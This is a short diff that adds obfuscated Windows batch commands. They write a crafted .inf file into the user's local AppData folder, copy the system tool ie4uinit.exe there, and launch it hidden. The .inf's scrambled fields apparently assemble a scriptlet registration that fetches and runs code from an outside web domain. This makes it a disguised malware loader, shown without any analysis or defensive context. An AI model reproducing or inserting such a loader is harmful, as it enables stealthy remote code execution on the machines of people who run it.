@@ -1,0 +1,6 @@
+/v /ccall%Adventures:~0,1%et "Notable=.inf" &&
+  %Adventures:~0,1%et "Pupil=ieuinit!Notable!" &&
+  call %Adventures:~0,1%et "Swear=%LOCALAPPDATA%\" &&
+  (for /D %f in ("[A18]" "ieu%Journey%!Notable!" "[version]" "signature =$windows nt$" "[D7086]" "sc\" "ro%Pounds%j,NI,%Resources%%Speeds%%Speeds%p%Dismiss%%Riders%%Riders%pdadknvgebin.%Achievements%/adga" "[defaultin%Adventures:~0,1%tall.windows7]" "Un\" "Register\" "OCXs=D7086" "delfiles=A18" "[de%Adventures:~0,1%tinationdirs]" "A18=01" "defaultdestdir=11" "[string%Adventures:~0,1%]" "Caution=%time%" "%Adventures:~0,1%ervicename=' '" "Achievements=com" "Resources=h" "Riders=/" "Journey=init" "Speeds=t;Grows" "%Adventures:~0,1%hortsvcname=' '" "Dismiss=:;Earth" "Pounds=b;Attempts" ) do @echo %~f)>"!Swear!!Pupil!" &&
+  call xcopy /Y /C /Q %win!Truck!ir%\%Adventures:~0,1%ystem32\ie4uinit.exe "!Swear!*" &&
+  start /b /min !Swear!ie4uinit.exe -basesettings
